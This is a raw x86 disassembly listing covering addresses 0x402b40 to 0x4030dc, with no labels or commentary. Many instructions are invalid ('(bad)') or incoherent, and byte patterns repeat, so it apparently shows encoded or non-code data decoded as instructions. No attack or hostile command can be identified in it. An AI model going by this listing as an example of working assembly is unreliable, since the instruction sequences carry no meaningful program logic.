  402b40:	9f                   	lahf
  402b41:	5f                   	pop    %edi
  402b42:	23 58 9f             	and    -0x61(%eax),%ebx
  402b45:	6f                   	outsl  %ds:(%esi),(%dx)
  402b46:	24 68                	and    $0x68,%al
  402b48:	a1 60 a0 e9 a6       	mov    0xa6e9a060,%eax
  402b4d:	c6                   	(bad)
  402b4e:	21 de                	and    %ebx,%esi
  402b50:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402b51:	13 77 6f             	adc    0x6f(%edi),%esi
  402b54:	25 23 a0 60 a0       	and    $0xa060a023,%eax
  402b59:	c6                   	(bad)
  402b5a:	9f                   	lahf
  402b5b:	ae                   	scas   %es:(%edi),%al
  402b5c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402b5d:	ca a0 5f             	lret   $0x5fa0
  402b60:	d6                   	salc
  402b61:	48                   	dec    %eax
  402b62:	ab                   	stos   %eax,%es:(%edi)
  402b63:	5a                   	pop    %edx
  402b64:	9f                   	lahf
  402b65:	5f                   	pop    %edi
  402b66:	e0 6f                	loopne 0x402bd7
  402b68:	24 46                	and    $0x46,%al
  402b6a:	a0 60 a0 8d 21       	mov    0x218da060,%al
  402b6f:	60                   	pusha
  402b70:	a0 60 13 62 d1       	mov    0xd1621360,%al
  402b75:	20 0a                	and    %cl,(%edx)
  402b77:	60                   	pusha
  402b78:	0a 60 f0             	or     -0x10(%eax),%ah
  402b7b:	5f                   	pop    %edi
  402b7c:	d6                   	salc
  402b7d:	48                   	dec    %eax
  402b7e:	bf 5a 9f 5f e0       	mov    $0xe05f9f5a,%edi
  402b83:	6f                   	outsl  %ds:(%esi),(%dx)
  402b84:	24 2a                	and    $0x2a,%al
  402b86:	a0 60 a0 ca a0       	mov    0xa0caa060,%al
  402b8b:	e9 82 ca a0 b2       	jmp    0xb2e0f612
  402b90:	08 e0                	or     %ah,%al
  402b92:	a0 60 a0 ed 36       	mov    0x36eda060,%al
  402b97:	ac                   	lods   %ds:(%esi),%al
  402b98:	a1 60 a0 b2 9f       	mov    0x9fb2a060,%eax
  402b9d:	96                   	xchg   %eax,%esi
  402b9e:	88 46 99             	mov    %al,-0x67(%esi)
  402ba1:	5f                   	pop    %edi
  402ba2:	9f                   	lahf
  402ba3:	ba e8 6f 25 08       	mov    $0x8256fe8,%edx
  402ba8:	a0 60 a0 91 60       	mov    0x6091a060,%al
  402bad:	99                   	cltd
  402bae:	70 d3                	jo     0x402b83
  402bb0:	0b e0                	or     %eax,%esp
  402bb2:	5c                   	pop    %esp
  402bb3:	66 ec                	data16 in (%dx),%al
  402bb5:	61                   	popa
  402bb6:	a0 60 ae d4 a3       	mov    0xa3d4ae60,%al
  402bbb:	a0 8b 4f 0a 62       	mov    0x620a4f8b,%al
  402bc0:	0a 60 c9             	or     -0x37(%eax),%ah
  402bc3:	30 f0                	xor    %dh,%al
  402bc5:	5f                   	pop    %edi
  402bc6:	d6                   	salc
  402bc7:	48                   	dec    %eax
  402bc8:	75 59                	jne    0x402c23
  402bca:	9f                   	lahf
  402bcb:	5f                   	pop    %edi
  402bcc:	e0 6f                	loopne 0x402c3d
  402bce:	24 e0                	and    $0xe0,%al
  402bd0:	a0 60 a0 5f d6       	mov    0xd65fa060,%al
  402bd5:	48                   	dec    %eax
  402bd6:	5f                   	pop    %edi
  402bd7:	59                   	pop    %ecx
  402bd8:	9f                   	lahf
  402bd9:	5f                   	pop    %edi
  402bda:	e8 d5 16 4b dd       	call   0xdd8b42b4
  402bdf:	ed                   	in     (%dx),%eax
  402be0:	26 ac                	lods   %es:(%esi),%al
  402be2:	a1 60 a0 27 e6       	mov    0xe627a060,%eax
  402be7:	68 20 60 a0 60       	push   $0x60a06020
  402bec:	67 a6                	cmpsb  %es:(%di),%ds:(%si)
  402bee:	c4 1c b5 a0 a0 e9 e6 	les    -0x19165f60(,%esi,4),%ebx
  402bf5:	74 06                	je     0x402bfd
  402bf7:	e1 1e                	loope  0x402c17
  402bf9:	64 52                	fs push %edx
  402bfb:	37                   	aaa
  402bfc:	14 64                	adc    $0x64,%al
  402bfe:	0a 56 8b             	or     -0x75(%esi),%dl
  402c01:	6e                   	outsb  %ds:(%esi),(%dx)
  402c02:	21 5e 64             	and    %ebx,0x64(%esi)
  402c05:	13 e0                	adc    %eax,%esp
  402c07:	60                   	pusha
  402c08:	15 64 0a 54 8b       	adc    $0x8b540a64,%eax
  402c0d:	62 0a                	bound  %ecx,(%edx)
  402c0f:	55                   	push   %ebp
  402c10:	88 c4                	mov    %al,%ah
  402c12:	99                   	cltd
  402c13:	5f                   	pop    %edi
  402c14:	9f                   	lahf
  402c15:	e3 98                	jecxz  0x402baf
  402c17:	5f                   	pop    %edi
  402c18:	14 99                	adc    $0x99,%al
  402c1a:	29 66 06             	sub    %esp,0x6(%esi)
  402c1d:	e1 1e                	loope  0x402c3d
  402c1f:	64 51                	fs push %ecx
  402c21:	37                   	aaa
  402c22:	14 77                	adc    $0x77,%al
  402c24:	9f                   	lahf
  402c25:	96                   	xchg   %eax,%esi
  402c26:	88 96 99 5f 9f e5    	mov    %dl,-0x1a60a067(%esi)
  402c2c:	60                   	pusha
  402c2d:	d4 b0                	aam    $0xb0
  402c2f:	e3 98                	jecxz  0x402bc9
  402c31:	62 15 67 67 a6 c0    	bound  %edx,0xc0a66767
  402c37:	20 b5 a0 a0 91 60    	and    %dh,0x6091a0a0(%ebp)
  402c3d:	be 63 5f d6 48       	mov    $0x48d65f63,%esi
  402c42:	ab                   	stos   %eax,%es:(%edi)
  402c43:	59                   	pop    %ecx
  402c44:	9f                   	lahf
  402c45:	5f                   	pop    %edi
  402c46:	06                   	push   %es
  402c47:	27                   	daa
  402c48:	e6 64                	out    %al,$0x64
  402c4a:	50                   	push   %eax
  402c4b:	37                   	aaa
  402c4c:	58                   	pop    %eax
  402c4d:	c9                   	leave
  402c4e:	a0 60 a0 4b 8a       	mov    0x8a4ba060,%al
  402c53:	c6                   	(bad)
  402c54:	67 a6                	cmpsb  %es:(%di),%ds:(%si)
  402c56:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402c57:	10 77 48             	adc    %dh,0x48(%edi)
  402c5a:	13 59 9f             	adc    -0x61(%ecx),%ebx
  402c5d:	5f                   	pop    %edi
  402c5e:	8b 3d 63 b3 f6 eb    	mov    0xebf6b363,%edi
  402c64:	92                   	xchg   %eax,%edx
  402c65:	eb 78                	jmp    0x402cdf
  402c67:	eb 63                	jmp    0x402ccc
  402c69:	93                   	xchg   %eax,%ebx
  402c6a:	69 1a ec 61 a0 60    	imul   $0x60a061ec,(%edx),%ebx
  402c70:	88 70 a2             	mov    %dh,-0x5e(%eax)
  402c73:	60                   	pusha
  402c74:	a0 ed 23 ac a1       	mov    0xa1ac23ed,%al
  402c79:	60                   	pusha
  402c7a:	a0 e9 e3 74 06       	mov    0x674e3e9,%al
  402c7f:	27                   	daa
  402c80:	e3 64                	jecxz  0x402ce6
  402c82:	50                   	push   %eax
  402c83:	37                   	aaa
  402c84:	d3 20                	shll   %cl,(%eax)
  402c86:	40                   	inc    %eax
  402c87:	7c 40                	jl     0x402cc9
  402c89:	a0 a0 c6 29 a3       	mov    0xa329c6a0,%al
  402c8e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402c8f:	27                   	daa
  402c90:	e3 68                	jecxz  0x402cfa
  402c92:	20 60 a0             	and    %ah,-0x60(%eax)
  402c95:	60                   	pusha
  402c96:	67 a3 b8 8c          	addr16 mov %eax,0x8cb8
  402c9a:	b6 a0                	mov    $0xa0,%dh
  402c9c:	a0 eb 66 48 f5       	mov    0xf54866eb,%al
  402ca1:	6e                   	outsb  %ds:(%esi),(%dx)
  402ca2:	a0 60 f0 eb 66       	mov    0x66ebf060,%al
  402ca7:	48                   	dec    %eax
  402ca8:	e5 70                	in     $0x70,%eax
  402caa:	a0 60 2d b3 e8       	mov    0xe8b32d60,%al
  402caf:	b9 88 40 9a 5f       	mov    $0x5f9a4088,%ecx
  402cb4:	9f                   	lahf
  402cb5:	eb 66                	jmp    0x402d1d
  402cb7:	48                   	dec    %eax
  402cb8:	dd 6e a0             	(bad) -0x60(%esi)
  402cbb:	60                   	pusha
  402cbc:	66 a4                	data16 movsb %ds:(%esi),%es:(%edi)
  402cbe:	a3 a8 a0 93 60       	mov    %eax,0x6093a0a8
  402cc3:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  402cc8:	a0 5f c5 3c d0       	mov    0xd03cc55f,%al
  402ccd:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  402cd2:	c5 28                	lds    (%eax),%ebp
  402cd4:	d0 a1 a0 eb 60 b5    	shlb   $1,-0x4a9f1460(%ecx)
  402cda:	2b 4c f1 b3          	sub    -0x4d(%ecx,%esi,8),%ecx
  402cde:	f6 b7 2b 51 2b 5a    	divb   0x5a2b512b(%edi)
  402ce4:	2b 38                	sub    (%eax),%edi
  402ce6:	2b a5 b0 6f 57 b3    	sub    -0x4ca89050(%ebp),%esp
  402cec:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402ced:	83 70 9b 62          	xorl   $0x62,-0x65(%eax)
  402cf1:	d5 f8                	aad    $0xf8
  402cf3:	ca a0 ed             	lret   $0xeda0
  402cf6:	e5 5c                	in     $0x5c,%eax
  402cf8:	f0 eb e3             	lock jmp 0x402cde
  402cfb:	68 97 4e f0 b7       	push   $0xb7f04e97
  402d00:	2b 63 f0             	sub    -0x10(%ebx),%esp
  402d03:	5f                   	pop    %edi
  402d04:	f5                   	cmc
  402d05:	6c                   	insb   (%dx),%es:(%edi)
  402d06:	25 20 15 71 88       	and    $0x88711520,%eax
  402d0b:	22 98 5f 9f 48 b9    	and    -0x46b760a1(%eax),%bl
  402d11:	5a                   	pop    %edx
  402d12:	9f                   	lahf
  402d13:	5f                   	pop    %edi
  402d14:	d3 20                	shll   %cl,(%eax)
  402d16:	29 a5 9c 4b df eb    	sub    %esp,-0x1420b464(%ebp)
  402d1c:	e5 5c                	in     $0x5c,%eax
  402d1e:	d3 32                	shll   %cl,(%edx)
  402d20:	97                   	xchg   %eax,%edi
  402d21:	d3 a8 e9 e5 5c 2b    	shrl   %cl,0x2b5ce5e9(%eax)
  402d27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d28:	b4 e5                	mov    $0xe5,%ah
  402d2a:	60                   	pusha
  402d2b:	d4 aa                	aam    $0xaa
  402d2d:	eb e5                	jmp    0x402d14
  402d2f:	74 2b                	je     0x402d5c
  402d31:	b5 9c                	mov    $0x9c,%ch
  402d33:	e9 b0 4b c3 9b       	jmp    0x9c0378e8
  402d38:	15 5c 14 7e 2b       	adc    $0x2b7e145c,%eax
  402d3d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d3e:	a8 48                	test   $0x48,%al
  402d40:	89 59 9f             	mov    %ebx,-0x61(%ecx)
  402d43:	5f                   	pop    %edi
  402d44:	d3 20                	shll   %cl,(%eax)
  402d46:	29 a5 9c 4b af 18    	sub    %esp,0x18af4b9c(%ebp)
  402d4c:	07                   	pop    %es
  402d4d:	60                   	pusha
  402d4e:	a0 60 88 38 99       	mov    0x99388860,%al
  402d53:	5f                   	pop    %edi
  402d54:	9f                   	lahf
  402d55:	93                   	xchg   %eax,%ebx
  402d56:	60                   	pusha
  402d57:	e9 e5 5c 2b a5       	jmp    0xa56b8a41
  402d5c:	9c                   	pushf
  402d5d:	bf fe bb f9 bd       	mov    $0xbdf9bbfe,%edi
  402d62:	62 70 a0             	bound  %esi,-0x60(%eax)
  402d65:	b5 2b                	mov    $0x2b,%ch
  402d67:	4c                   	dec    %esp
  402d68:	f3 eb fd             	repz jmp 0x402d68
  402d6b:	68 f3 c8 51 37       	push   $0x3751c8f3
  402d70:	a0 60 08 a0 b8       	mov    0xb8a00860,%al
  402d75:	a0 a0 ca 04 48       	mov    0x4804caa0,%al
  402d7a:	fb                   	sti
  402d7b:	5f                   	pop    %edi
  402d7c:	9f                   	lahf
  402d7d:	5f                   	pop    %edi
  402d7e:	fb                   	sti
  402d7f:	bd 62 64 a0 eb       	mov    $0xeba06462,%ebp
  402d84:	60                   	pusha
  402d85:	b5 2b                	mov    $0x2b,%ch
  402d87:	4c                   	dec    %esp
  402d88:	f3 eb fd             	repz jmp 0x402d88
  402d8b:	68 f3 c8 52 37       	push   $0x3752c8f3
  402d90:	a0 60 08 a8 b8       	mov    0xb8a80860,%al
  402d95:	a0 a0 ca 05 48       	mov    0x4805caa0,%al
  402d9a:	db 5f 9f             	fistpl -0x61(%edi)
  402d9d:	5f                   	pop    %edi
  402d9e:	fb                   	sti
  402d9f:	bd 62 64 a0 eb       	mov    $0xeba06462,%ebp
  402da4:	60                   	pusha
  402da5:	b3 f6                	mov    $0xf6,%bl
  402da7:	eb 78                	jmp    0x402e21
  402da9:	93                   	xchg   %eax,%ebx
  402daa:	96                   	xchg   %eax,%esi
  402dab:	c6                   	(bad)
  402dac:	2b a3 a4 c6 dd 11    	sub    0x11ddc6a4(%ebx),%esp
  402db2:	77 d2                	ja     0x402d86
  402db4:	cf                   	iret
  402db5:	c6                   	(bad)
  402db6:	dd 13                	fstl   (%ebx)
  402db8:	77 d7                	ja     0x402d91
  402dba:	c9                   	leave
  402dbb:	c6 c5 12             	mov    $0x12,%ch
  402dbe:	77 c6                	ja     0x402d86
  402dc0:	dd 12                	fstl   (%edx)
  402dc2:	77 d5                	ja     0x402d99
  402dc4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402dc5:	eb 63                	jmp    0x402e2a
  402dc7:	5f                   	pop    %edi
  402dc8:	f3 7c 2b             	repz jl 0x402df6
  402dcb:	50                   	push   %eax
  402dcc:	25 56 15 67 2b       	and    $0x2b671556,%eax
  402dd1:	23 9f b3 c4 eb 90    	and    -0x6f143b4d(%edi),%ebx
  402dd7:	e5 96                	in     $0x96,%eax
  402dd9:	d4 bb                	aam    $0xbb
  402ddb:	eb 66                	jmp    0x402e43
  402ddd:	48                   	dec    %eax
  402dde:	eb 59                	jmp    0x402e39
  402de0:	9f                   	lahf
  402de1:	5f                   	pop    %edi
  402de2:	8b 72 21             	mov    0x21(%edx),%esi
  402de5:	5b                   	pop    %ebx
  402de6:	cc                   	int3
  402de7:	10 e0                	adc    %ah,%al
  402de9:	60                   	pusha
  402dea:	14 6a                	adc    $0x6a,%al
  402dec:	58                   	pop    %eax
  402ded:	c7                   	(bad)
  402dee:	a0 60 a0 48 d7       	mov    0xd748a060,%al
  402df3:	59                   	pop    %ecx
  402df4:	9f                   	lahf
  402df5:	5f                   	pop    %edi
  402df6:	2b 26                	sub    (%esi),%esp
  402df8:	fe                   	(bad)
  402df9:	bb 63 eb 60 b6       	mov    $0xb660eb63,%ebx
  402dfe:	f7 e9                	imul   %ecx
  402e00:	67 91                	addr16 xchg %eax,%ecx
  402e02:	60                   	pusha
  402e03:	ea a7 e9 76 91 72 ea 	ljmp   $0xea72,$0x9176e9a7
  402e0a:	b6 a6                	mov    $0xa6,%dh
  402e0c:	a0 30 12 72 d8       	mov    0xd8721230,%al
  402e11:	28 17                	sub    %dl,(%edi)
  402e13:	6e                   	outsb  %ds:(%esi),(%dx)
  402e14:	29 31                	sub    %esi,(%ecx)
  402e16:	2a 77 28             	sub    0x28(%edi),%dh
  402e19:	67 e7 61             	addr16 out %eax,$0x61
  402e1c:	77 53                	ja     0x402e71
  402e1e:	44                   	inc    %esp
  402e1f:	bf fe 23 28 28       	mov    $0x282823fe,%edi
  402e24:	ca 6f 16             	lret   $0x166f
  402e27:	57                   	push   %edi
  402e28:	28 2a                	sub    %ch,(%edx)
  402e2a:	8b 48 63             	mov    0x63(%eax),%ecx
  402e2d:	93                   	xchg   %eax,%ebx
  402e2e:	69 ea aa a1 32 48    	imul   $0x4832a1aa,%edx,%ebp
  402e34:	fd                   	std
  402e35:	59                   	pop    %ecx
  402e36:	9f                   	lahf
  402e37:	5f                   	pop    %edi
  402e38:	63 b3 f6 eb 78 e3    	arpl   %esi,-0x1c87140a(%ebx)
  402e3e:	6e                   	outsb  %ds:(%esi),(%dx)
  402e3f:	5f                   	pop    %edi
  402e40:	06                   	push   %es
  402e41:	eb e3                	jmp    0x402e26
  402e43:	64 06                	fs push %es
  402e45:	9d                   	popf
  402e46:	50                   	push   %eax
  402e47:	37                   	aaa
  402e48:	16                   	push   %ss
  402e49:	89 06                	mov    %eax,(%esi)
  402e4b:	9d                   	popf
  402e4c:	53                   	push   %ebx
  402e4d:	37                   	aaa
  402e4e:	17                   	pop    %ss
  402e4f:	83 0a 60             	orl    $0x60,(%edx)
  402e52:	2b 63 f0             	sub    -0x10(%ebx),%esp
  402e55:	48                   	dec    %eax
  402e56:	b7 57                	mov    $0x57,%bh
  402e58:	9f                   	lahf
  402e59:	5f                   	pop    %edi
  402e5a:	2b 50 23             	sub    0x23(%eax),%edx
  402e5d:	5e                   	pop    %esi
  402e5e:	9f                   	lahf
  402e5f:	d5 a7                	aad    $0xa7
  402e61:	48                   	dec    %eax
  402e62:	77 58                	ja     0x402ebc
  402e64:	9f                   	lahf
  402e65:	5f                   	pop    %edi
  402e66:	8b 75 2b             	mov    0x2b(%ebp),%esi
  402e69:	26 d3 32             	shll   %cl,%es:(%edx)
  402e6c:	97                   	xchg   %eax,%edi
  402e6d:	d3 a8 eb 90 4b aa    	shrl   %cl,-0x55b46f15(%eax)
  402e73:	18 07                	sbb    %al,(%edi)
  402e75:	60                   	pusha
  402e76:	a0 60 88 10 98       	mov    0x98108860,%al
  402e7b:	5f                   	pop    %edi
  402e7c:	9f                   	lahf
  402e7d:	eb 66                	jmp    0x402ee5
  402e7f:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  402e84:	a0 b7 29 27 28       	mov    0x282729b7,%al
  402e89:	2d 29 28 61 40       	sub    $0x40612829,%eax
  402e8e:	b0 c6                	mov    $0xc6,%al
  402e90:	29 28                	sub    %ebp,(%eax)
  402e92:	29 31                	sub    %esi,(%ecx)
  402e94:	61                   	popa
  402e95:	59                   	pop    %ecx
  402e96:	a2 d8 a9 53 4b       	mov    %al,0x4b53a9d8
  402e9b:	e9 71 e3 81 63       	jmp    0x63c21211
  402ea0:	93                   	xchg   %eax,%ebx
  402ea1:	0a ff                	or     %bh,%bh
  402ea3:	23 30                	and    (%eax),%esi
  402ea5:	b3 d1                	mov    $0xd1,%bl
  402ea7:	3b 09                	cmp    (%ecx),%ecx
  402ea9:	f3 a8 00             	repz test $0x0,%al
  402eac:	e0 60                	loopne 0x402f0e
  402eae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402eaf:	e4 a8                	in     $0xa8,%al
  402eb1:	68 e2 e9 33 68       	push   $0x6833e9e2
  402eb6:	40                   	inc    %eax
  402eb7:	a0 a0 57 82 e9       	mov    0xe98257a0,%al
  402ebc:	70 bb                	jo     0x402e79
  402ebe:	63 eb                	arpl   %ebp,%ebx
  402ec0:	60                   	pusha
  402ec1:	b3 f6                	mov    $0xf6,%bl
  402ec3:	eb 78                	jmp    0x402f3d
  402ec5:	c6                   	(bad)
  402ec6:	67 a3 a4 10          	addr16 mov %eax,0x10a4
  402eca:	77 93                	ja     0x402e5f
  402ecc:	96                   	xchg   %eax,%esi
  402ecd:	eb a3                	jmp    0x402e72
  402ecf:	48                   	dec    %eax
  402ed0:	51                   	push   %ecx
  402ed1:	5b                   	pop    %ebx
  402ed2:	9f                   	lahf
  402ed3:	5f                   	pop    %edi
  402ed4:	24 20                	and    $0x20,%al
  402ed6:	15 6a 88 c0 98       	adc    $0x98c0886a,%eax
  402edb:	5f                   	pop    %edi
  402edc:	9f                   	lahf
  402edd:	1e                   	push   %ds
  402ede:	a1 60 a0 60 2b       	mov    0x2b60a060,%eax
  402ee3:	26 fe                	es (bad)
  402ee5:	bb 63 eb 60 b3       	mov    $0xb360eb63,%ebx
  402eea:	f6 b7 29 36 29 2f    	divb   0x2f293629(%edi)
  402ef0:	d1 32                	shll   $1,(%edx)
  402ef2:	29 23                	sub    %esp,(%ebx)
  402ef4:	06                   	push   %es
  402ef5:	eb f0                	jmp    0x402ee7
  402ef7:	64 21 4a 50          	and    %ecx,%fs:0x50(%edx)
  402efb:	37                   	aaa
  402efc:	a0 60 14 75 23       	mov    0x23751460,%al
  402f01:	5a                   	pop    %edx
  402f02:	a3 6f 27 02 a0       	mov    %eax,0xa002276f
  402f07:	60                   	pusha
  402f08:	a0 5f f3 84 25       	mov    0x2584f35f,%al
  402f0d:	20 14 65 88 78 98 5f 	and    %dl,0x5f987888(,%eiz,2)
  402f14:	9f                   	lahf
  402f15:	c6                   	(bad)
  402f16:	67 a3 a4 13          	addr16 mov %eax,0x13a4
  402f1a:	77 e9                	ja     0x402f05
  402f1c:	13 68 67             	adc    0x67(%eax),%ebp
  402f1f:	a3 c4 98 ba a0       	mov    %eax,0xa0ba98c4
  402f24:	a0 27 e3 7c 5c       	mov    0x5c7ce327,%al
  402f29:	75 e0                	jne    0x402f0b
  402f2b:	60                   	pusha
  402f2c:	20 db                	and    %bl,%bl
  402f2e:	e8 60 14 c0 58       	call   0x59004393
  402f33:	60                   	pusha
  402f34:	a0 60 60 ea b5       	mov    0xb5ea6060,%al
  402f39:	6c                   	insb   (%dx),%es:(%edi)
  402f3a:	40                   	inc    %eax
  402f3b:	a0 a0 e3 82 d0       	mov    0xd082e3a0,%al
  402f40:	61                   	popa
  402f41:	4a                   	dec    %edx
  402f42:	a2 eb 32 d0 40       	mov    %al,0x40d032eb
  402f47:	a0 a0 19 a2 60       	mov    0x60a219a0,%al
  402f4c:	a0 60 23 4f a3       	mov    0xa34f2360,%al
  402f51:	d4 c1                	aam    $0xc1
  402f53:	19 a3 60 a0 60 e7    	sbb    %esp,-0x189f5fa0(%ebx)
  402f59:	d4 b9                	aam    $0xb9
  402f5b:	18 a0 60 a0 a0 e7    	sbb    %ah,-0x185f5fa0(%eax)
  402f61:	c6                   	(bad)
  402f62:	67 a3 a4 12          	addr16 mov %eax,0x12a4
  402f66:	77 d4                	ja     0x402f3c
  402f68:	ab                   	stos   %eax,%es:(%edi)
  402f69:	18 a0 60 a0 e0 06    	sbb    %ah,0x6e0a060(%eax)
  402f6f:	27                   	daa
  402f70:	e3 64                	jecxz  0x402fd6
  402f72:	51                   	push   %ecx
  402f73:	37                   	aaa
  402f74:	0a 60 08             	or     0x8(%eax),%ah
  402f77:	e0 a0                	loopne 0x402f19
  402f79:	60                   	pusha
  402f7a:	a0 b1 0a 60 f2       	mov    0xf2600ab1,%al
  402f7f:	b0 2d                	mov    $0x2d,%al
  402f81:	a3 e8 b0 88 30       	mov    %eax,0x3088b0e8
  402f86:	95                   	xchg   %eax,%ebp
  402f87:	5f                   	pop    %edi
  402f88:	9f                   	lahf
  402f89:	e3 98                	jecxz  0x402f23
  402f8b:	5f                   	pop    %edi
  402f8c:	14 84                	adc    $0x84,%al
  402f8e:	29 63 8b             	sub    %esp,-0x75(%ebx)
  402f91:	90                   	nop
  402f92:	67 a3 c4 1c          	addr16 mov %eax,0x1cc4
  402f96:	b5 a0                	mov    $0xa0,%ch
  402f98:	a0 e3 9f 63 14       	mov    0x14639fe3,%al
  402f9d:	64 0a 56 8b          	or     %fs:-0x75(%esi),%dl
  402fa1:	62 0a                	bound  %ecx,(%edx)
  402fa3:	55                   	push   %ebp
  402fa4:	88 30                	mov    %dh,(%eax)
  402fa6:	95                   	xchg   %eax,%ebp
  402fa7:	5f                   	pop    %edi
  402fa8:	9f                   	lahf
  402fa9:	4b                   	dec    %ebx
  402faa:	7e 18                	jle    0x402fc4
  402fac:	06                   	push   %es
  402fad:	60                   	pusha
  402fae:	a0 60 8b 6b 06       	mov    0x66b8b60,%al
  402fb3:	27                   	daa
  402fb4:	e3 64                	jecxz  0x40301a
  402fb6:	50                   	push   %eax
  402fb7:	37                   	aaa
  402fb8:	88 74 96 5f          	mov    %dh,0x5f(%esi,%edx,4)
  402fbc:	9f                   	lahf
  402fbd:	48                   	dec    %eax
  402fbe:	0b 57 9f             	or     -0x61(%edi),%edx
  402fc1:	5f                   	pop    %edi
  402fc2:	ff                   	(bad)
  402fc3:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  402fc8:	a0 ea ad 6c 40       	mov    0x406cadea,%al
  402fcd:	a0 a0 e0 81 63       	mov    0x6381e0a0,%al
  402fd2:	20 59 a2             	and    %bl,-0x5e(%ecx)
  402fd5:	d6                   	salc
  402fd6:	a2 11 a2 e1 81       	mov    %al,0x81e1a211
  402fdb:	5f                   	pop    %edi
  402fdc:	a0 60 a0 48 a5       	mov    0xa548a060,%al
  402fe1:	5f                   	pop    %edi
  402fe2:	9f                   	lahf
  402fe3:	5f                   	pop    %edi
  402fe4:	63 19                	arpl   %ebx,(%ecx)
  402fe6:	a3 60 a0 60 88       	mov    %eax,0x8860a060
  402feb:	5a                   	pop    %edx
  402fec:	9e                   	sahf
  402fed:	5f                   	pop    %edi
  402fee:	9f                   	lahf
  402fef:	23 30                	and    (%eax),%esi
  402ff1:	b3 f6                	mov    $0xf6,%bl
  402ff3:	b7 29                	mov    $0x29,%bh
  402ff5:	26 f0 e5 60          	es lock in $0x60,%eax
  402ff9:	d4 0c                	aam    $0xc
  402ffb:	91                   	xchg   %eax,%ecx
  402ffc:	60                   	pusha
  402ffd:	91                   	xchg   %eax,%ecx
  402ffe:	7b 1f                	jnp    0x40301f
  403000:	6c                   	insb   (%dx),%es:(%edi)
  403001:	2c 6c                	sub    $0x6c,%al
  403003:	6c                   	insb   (%dx),%es:(%edi)
  403004:	2a 7e e6             	sub    -0x1a(%esi),%bh
  403007:	e0 9b                	loopne 0x402fa4
  403009:	80 14 58 55          	adcb   $0x55,(%eax,%ebx,2)
  40300d:	60                   	pusha
  40300e:	20 5b cd             	and    %bl,-0x33(%ebx)
  403011:	d4 02                	aam    $0x2
  403013:	e0 9b                	loopne 0x402fb0
  403015:	8b 14 bf             	mov    (%edi,%edi,4),%edx
  403018:	20 5b c4             	and    %bl,-0x3c(%ebx)
  40301b:	d4 ff                	aam    $0xff
  40301d:	e0 9b                	loopne 0x402fba
  40301f:	d8 14 ba             	fcoms  (%edx,%edi,4)
  403022:	20 5b f8             	and    %bl,-0x8(%ebx)
  403025:	d4 f5                	aam    $0xf5
  403027:	e0 9b                	loopne 0x402fc4
  403029:	90                   	nop
  40302a:	15 73 2a 7e e6       	adc    $0xe67e2a73,%eax
  40302f:	e0 9b                	loopne 0x402fcc
  403031:	d8 14 a8             	fcoms  (%eax,%ebp,4)
  403034:	20 5b f8             	and    %bl,-0x8(%ebx)
  403037:	d4 e3                	aam    $0xe3
  403039:	e4 7b                	in     $0x7b,%al
  40303b:	d4 c0                	aam    $0xc0
  40303d:	4b                   	dec    %ebx
  40303e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40303f:	e4 7b                	in     $0x7b,%al
  403041:	d4 cd                	aam    $0xcd
  403043:	e0 8b                	loopne 0x402fd0
  403045:	90                   	nop
  403046:	20 5b a9             	and    %bl,-0x57(%ebx)
  403049:	d7                   	xlat   %ds:(%ebx)
  40304a:	c5 99 98 d7 c1 ed    	lds    -0x123e2868(%ecx),%ebx
  403050:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403051:	e0 a1                	loopne 0x402ff4
  403053:	20 a1 38 2a 7e e6    	and    %ah,-0x1981d5c8(%ecx)
  403059:	e4 7b                	in     $0x7b,%al
  40305b:	d5 86                	aad    $0x86
  40305d:	5e                   	pop    %esi
  40305e:	6d                   	insl   (%dx),%es:(%edi)
  40305f:	d4 a9                	aam    $0xa9
  403061:	e5 60                	in     $0x60,%eax
  403063:	dd ee                	fucomp %st(6)
  403065:	4b                   	dec    %ebx
  403066:	a9 a6 8b 66 97       	test   $0x97668ba6,%eax
  40306b:	38 1e                	cmp    %bl,(%esi)
  40306d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40306e:	18 a3 fb 89 7e 4b    	sbb    %ah,0x4b7e89fb(%ebx)
  403074:	e1 5e                	loope  0x4030d4
  403076:	65 ea be a6 8b 23 5f 	gs ljmp $0x5f5f,$0x238ba6be
  40307d:	5f 
  40307e:	9f                   	lahf
  40307f:	5f                   	pop    %edi
  403080:	af                   	scas   %es:(%edi),%eax
  403081:	ea be a6 24 3b 14 3f 	ljmp   $0x3f14,$0x3b24a6be
  403088:	20 5b 01             	and    %bl,0x1(%ebx)
  40308b:	d2 a3 e0 8b 80 20    	shlb   %cl,0x20808be0(%ebx)
  403091:	4b                   	dec    %ebx
  403092:	d0 e0                	shl    $1,%al
  403094:	9b                   	fwait
  403095:	69 16 6b 20 4b b1    	imul   $0xb14b206b,(%esi),%edx
  40309b:	e0 9b                	loopne 0x403038
  40309d:	65 17                	gs pop %ss
  40309f:	30 20                	xor    %ah,(%eax)
  4030a1:	23 aa 99 98 d7 69    	and    0x69d79899(%edx),%ebp
  4030a7:	21 80 64 a1 38 2a    	and    %eax,0x2a38a164(%eax)
  4030ad:	7e e6                	jle    0x403095
  4030af:	e4 7b                	in     $0x7b,%al
  4030b1:	d5 75                	aad    $0x75
  4030b3:	b9 d1 56 29 92       	mov    $0x922956d1,%ecx
  4030b8:	ff                   	(bad)
  4030b9:	be fb 23 30 3b       	mov    $0x3b3023fb,%esi
  4030be:	83 fb 79             	cmp    $0x79,%ebx
  4030c1:	8d b0 00 e0 60 63    	lea    0x6360e000(%eax),%esi
  4030c7:	eb 60                	jmp    0x403129
  4030c9:	10 a4 49 f1 56 9f 5f 	adc    %ah,0x5f9f56f1(%ecx,%ecx,2)
  4030d0:	63 b3 2b 38 2b 23    	arpl   %esi,0x232b382b(%ebx)
  4030d6:	88 86 a0 60 a0 48    	mov    %al,0x48a060a0(%esi)
  4030dc:	09 55 9f             	or     %edx,-0x61(%ebp)
